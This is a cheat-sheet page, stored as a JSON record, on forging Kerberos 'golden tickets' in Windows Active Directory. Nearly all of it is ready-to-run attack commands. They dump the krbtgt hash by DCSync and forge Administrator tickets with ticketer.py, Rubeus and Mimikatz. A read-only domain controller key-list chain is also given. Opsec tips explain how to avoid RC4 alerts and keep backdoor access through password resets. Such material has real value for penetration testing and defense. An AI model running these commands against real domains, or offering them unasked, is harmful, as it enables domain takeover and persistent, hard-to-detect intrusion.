{"title": "golden-ticket", "source": "cheatsheet", "source_label": "Cheat Sheets", "path": "cheatsheet/ref-windows-golden-ticket", "html": "<h1 id=\"windows-golden-ticket\">golden-ticket</h1>\n<p>Forge TGTs using the krbtgt account hash. Provides persistent domain-level access -- any user, any group, any ticket lifetime. Requires the krbtgt hash (obtained via DCSync or NTDS extraction).</p>\n<h3>When to Use</h3>\n<p>- Have krbtgt NTLM hash or AES key (post-compromise) - Want persistent domain admin access - Need to impersonate any user including Administrator - Backdoor access even after password resets (until krbtgt is rotated twice)</p>\n<h3>Prerequisites</h3>\n<p>Collect these before forging:</p>\n<pre><code class=\"language-bash\"># Domain SID\nlookupsid.py &#x27;domain.local/user:pass@DC_IP&#x27; | grep &#x27;Domain SID&#x27;\n\n# krbtgt hash via DCSync\nsecretsdump.py &#x27;domain.local/admin:pass@DC_IP&#x27; -just-dc-user krbtgt</code></pre>\n<h3>Impacket - ticketer.py</h3>\n<h4>Forge golden ticket (NTLM)</h4>\n<pre><code class=\"language-bash\">ticketer.py -nthash KRBTGT_NTHASH -domain-sid S-1-5-21-XXXX -domain domain.local Administrator</code></pre>\n<h4>Forge golden ticket (AES256)</h4>\n<pre><code class=\"language-bash\">ticketer.py -aesKey AES256_KEY -domain-sid S-1-5-21-XXXX -domain domain.local Administrator</code></pre>\n<h4>Use the ticket</h4>\n<pre><code class=\"language-bash\">export KRB5CCNAME=Administrator.ccache\npsexec.py -k -no-pass domain.local/Administrator@dc.domain.local</code></pre>\n<h3>Rubeus</h3>\n<h4>Forge golden ticket</h4>\n<pre><code class=\"language-powershell\">.\\Rubeus.exe golden /rc4:KRBTGT_NTHASH /domain:domain.local /sid:S-1-5-21-XXXX /user:Administrator /ptt</code></pre>\n<h4>With AES256 (opsec-safe)</h4>\n<pre><code class=\"language-powershell\">.\\Rubeus.exe golden /aes256:AES256_KEY /domain:domain.local /sid:S-1-5-21-XXXX /user:Administrator /ptt</code></pre>\n<h4>With specific groups (DA, EA, Schema Admins)</h4>\n<pre><code class=\"language-powershell\">.\\Rubeus.exe golden /aes256:AES256_KEY /domain:domain.local /sid:S-1-5-21-XXXX /user:Administrator /groups:512,519,518 /ptt</code></pre>\n<h3>Mimikatz</h3>\n<pre><code class=\"language-powershell\">kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-XXXX /krbtgt:KRBTGT_NTHASH /ptt</code></pre>\n<h3>RODC Golden Ticket</h3>\n<p>From an RODC, the krbtgt account is <code>krbtgt_XXXXX</code> where XXXXX is the RODC number. Tickets forged with this key must be validated by a writable DC via the key list attack.</p>\n<h4>Forge RODC golden ticket (Rubeus)</h4>\n<pre><code class=\"language-powershell\">.\\Rubeus.exe golden /rodcNumber:XXXXX /aes256:RODC_AES256_KEY /domain:domain.local /sid:S-1-5-21-XXXX /user:Administrator /ptt</code></pre>\n<h4>Key list attack -- exchange RODC ticket for real TGT</h4>\n<pre><code class=\"language-powershell\">.\\Rubeus.exe asktgs /ticket:rodc_ticket.kirbi /keyList /service:krbtgt/domain.local /dc:dc.domain.local /ptt</code></pre>\n<h4>Full RODC chain (from Garfield box)</h4>\n<pre><code class=\"language-powershell\"># 1. Forge golden ticket with RODC krbtgt\n.\\Rubeus.exe golden /rodcNumber:25181 /aes256:RODC_AES256 /domain:domain.local /sid:S-1-5-21-XXXX /user:Administrator /ptt\n\n# 2. Key list attack to get real TGT from writable DC\n.\\Rubeus.exe asktgs /ticket:&lt;base64_ticket&gt; /keyList /service:krbtgt/domain.local /dc:dc01.domain.local /ptt\n\n# 3. Now DCSync with the real TGT\n.\\Rubeus.exe dump /service:krbtgt</code></pre>\n<h3>Clock Skew Fix (Exegol)</h3>\n<p>Kerberos requires clocks within 5 minutes. In exegol:</p>\n<pre><code class=\"language-bash\"># Sync time with DC\nfaketime &quot;$(ntpdate -q DC_IP 2&gt;/dev/null | head -1 | cut -d&#x27; &#x27; -f1,2)&quot; ticketer.py ...\n\n# Or set system time\nrdate -n DC_IP</code></pre>\n<h3>Notes</h3>\n<p>- Golden ticket survives password resets -- only rotating krbtgt TWICE invalidates it - AES256 is preferred over RC4 for opsec (RC4 triggers alerts) - RODC golden tickets only work for users in the RODC&#x27;s <code>msDS-RevealOnDemandGroup</code> - Key list attack (<code>/keyList</code>) converts RODC ticket to full DC ticket - Default ticket lifetime is 10 years in forged tickets</p>", "excerpt": "golden-ticket Forge TGTs using the krbtgt account hash. Provides persistent domain-level access -- any user, any group, any ticket lifetime. Requires the krbtgt hash (obtained via DCSync or NTDS extra…", "tags": ["reference", "windows"]}